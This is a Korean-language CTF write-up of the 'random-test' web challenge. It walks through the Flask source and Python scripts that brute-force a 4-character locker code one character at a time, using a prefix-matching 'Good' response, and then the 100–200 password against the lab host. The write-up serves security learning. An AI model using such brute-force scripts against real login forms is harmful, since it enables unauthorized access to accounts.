---
layout: single
title: "[wargame.kr] random-test write-up"
date: 2024-02-04 21:00 +0900
categories: 
    - WEB-write-up
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## 문제 설명

새 학기를 맞아 드림이에게 사물함이 배정되었습니다. 하지만 기억력이 안 좋은 드림이는 사물함 번호와 자물쇠 비밀번호를 모두 잊어버리고 말았어요... 드림이를 위해 사물함 번호와 자물쇠 비밀번호를 알아내 주세요!
사물함 번호는 알파벳 소문자 혹은 숫자를 포함하는 4자리 랜덤 문자열이고, 비밀번호는 100 이상 200 이하의 랜덤 정수입니다. 두 값을 맞게 입력하면 플래그가 출력됩니다. 플래그는 `FLAG` 변수에 있습니다.  

플래그 형식은 DH{...} 입니다.

<br>

## 풀이

문제에 접속하면 다음과 같이 사물함 번호와 자물쇠 비밀번호를 입력하는 폼이 존재한다.

![image-20240204210401207](/images/2024-02-04-random-test/image-20240204210401207.png)

<br>

### 소스 코드

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
import string
import random

app = Flask(__name__)

try:
    FLAG = open("./flag.txt", "r").read()       # flag is here!
except:
    FLAG = "[**FLAG**]"


rand_str = ""
alphanumeric = string.ascii_lowercase + string.digits
for i in range(4):
    rand_str += str(random.choice(alphanumeric))

rand_num = random.randint(100, 200)


@app.route("/", methods = ["GET", "POST"])
def index():
    if request.method == "GET":
        return render_template("index.html")
    else:
        locker_num = request.form.get("locker_num", "")
        password = request.form.get("password", "")

        if locker_num != "" and rand_str[0:len(locker_num)] == locker_num:
            if locker_num == rand_str and password == str(rand_num):
                return render_template("index.html", result = "FLAG:" + FLAG)
            return render_template("index.html", result = "Good")
        else: 
            return render_template("index.html", result = "Wrong!")
            
            
app.run(host="0.0.0.0", port=8000)
```

<br>

소스 코드를 분석하기 전에 문제 설명을 먼저 보면 사물함 번호는 알파벳 소문자 혹은 숫자를 포함하는 4자리 랜덤 문자열이고, 비밀번호는 100이상 200이하의 랜덤 정수이라고 한다. 

<br>
소스 코드를 분석해보면  `alphanumeric` 변수에 `string.ascii_lowercase` 함수를 사용해 알파벳 소문자와 `string.digits` 함수를 사용해 `0~9`의 숫자를 저장하고 있다. 이는 4번 반복해 4자리를 만들고 `random.choice` 함수를 사용하면서 무작위로 알파벳 소문자와 숫자를 뽑아온다. 아래의 `rand_num` 변수에는 `random.randit(100, 200)` 을 사용해 100이상 200이하의 랜덤한 정수를 반환한다. 

```python
rand_str = ""
alphanumeric = string.ascii_lowercase + string.digits
for i in range(4):
    rand_str += str(random.choice(alphanumeric))

rand_num = random.randint(100, 200)
```

<br>

### Flag 조건

일단 위의 소스 코드는 이미 문제 설명에서 설명해준 내용이다. Flag 조건의 소스 코드를 확인해보면 `locker_num`과 `password`의 파라미터 값을 받아와 저장한다. `locker_num` 이 빈 문자열이 아니고, `rand_str` 을 인덱스 0부터 `locker_num`의 길이까지 슬라이싱한 값이 `locker_num` 변수 값과 같아야 한다. 또한 `locker_num`과 `rand_str`의 값이 같고 `password`와 `rand_num`값이 같으면 flag를 출력해준다.

```python
@app.route("/", methods = ["GET", "POST"])
def index():
    if request.method == "GET":
        return render_template("index.html")
    else:
        locker_num = request.form.get("locker_num", "")
        password = request.form.get("password", "")

        if locker_num != "" and rand_str[0:len(locker_num)] == locker_num:
            if locker_num == rand_str and password == str(rand_num):
                return render_template("index.html", result = "FLAG:" + FLAG)
            return render_template("index.html", result = "Good")
        else: 
            return render_template("index.html", result = "Wrong!")
            
```

<br>

이건 무작위 대입 공격을 해야 하는 것인가..? 일단 먼저 아래의 조건이 부합하면 Good이라는 문자열을 출력해준다. 이를 토대로 rand_str 먼저 공략해보자. 위에서 말했던 것처럼 `rand_str`은 알파벳 소문자 혹은 숫자를 포함하는 4자리 랜덤 문자열이다. 

```python
if locker_num != "" and rand_str[0:len(locker_num)] == locker_num:
```

<br>

4자리를 무작위로 대입해서 맞춰보는 아래 코드를 작성했지만 답도 나오지 않는다... 

```python
import random
import string
import requests

url = "http://host3.dreamhack.games:12285"
for i in range(0,999999):
    print(f"{i}번째 시도 중입니다.")
    rand_str=""
    alphanumeric = string.ascii_lowercase + string.digits
    for i in range(4):
        rand_str += str(random.choice(alphanumeric))
    # print(rand_str)
    r = requests.post(url, data={'locker_num': rand_str})
    if 'Good' in r.text:
        print(f"rand_str 값은 {rand_str} 입니다.")
        break
```

<br>

다시 생각해보니 여기에 힌트가 있다. len 함수를 사용하니 첫 번째 자리 숫자부터 차례대로 맞춰보자.

```python
if locker_num != "" and rand_str[0:len(locker_num)] == locker_num:
```

<br>
4번 반복하는 구문을 주석처리하면 첫 번째 자리부터 차례대로 얻을 수 있다. 출력된 값을 `rand_str` 변수에 집어넣어주면 된다.

```python
import random
import string
import requests

url = "http://host3.dreamhack.games:12285"
for i in range(0,999999):
    print(f"{i}번째 시도 중입니다.")
    rand_str=""
    alphanumeric = string.ascii_lowercase + string.digits
    # for i in range(4):
    rand_str += str(random.choice(alphanumeric))
    # print(rand_str)
    r = requests.post(url, data={'locker_num': rand_str})
    if 'Good' in r.text:
        print(f"rand_str 값은 {rand_str} 입니다.")
        break
```

<br>

실행 결과 다음과 같이 rand_str을 알아냈고, 이를 사물함 번호에 웹에서 확인해보면 Good 문자열을 확인할 수 있다.

![image-20240205033716338](/images/2024-02-04-random-test/image-20240205033716338.png)

![image-20240205033816935](/images/2024-02-04-random-test/image-20240205033816935.png)

<br>

이제 자물쇠 비밀번호만 얻으면 된다. 이는 간단하게 반복문으로 100부터 200까지 돌리면 되겠다.

```python
import random
import string
import requests

url = "http://host3.dreamhack.games:12285"
for i in range(100, 201):
    print(f"{i}번째 시도 중입니다.")
    rand_str="vg2a"
    alphanumeric = string.digits
    # for i in range(4):
    password = int(i)
    # print(rand_str)
    r = requests.post(url, data={'locker_num':'vg2a', 'password':password})
    if 'DH' in r.text:
        print(r.text())
        break
```



<br>

약간 코드를 대충 수정해서 아래처럼 보인다... 190번째에 오류가 발생했으므로 자물쇠 비밀번호는 190이다!

![image-20240205034301546](/images/2024-02-04-random-test/image-20240205034301546.png)


<br>

다음과 같이 Flag를 얻을 수 있다.

![image-20240205034359498](/images/2024-02-04-random-test/image-20240205034359498.png)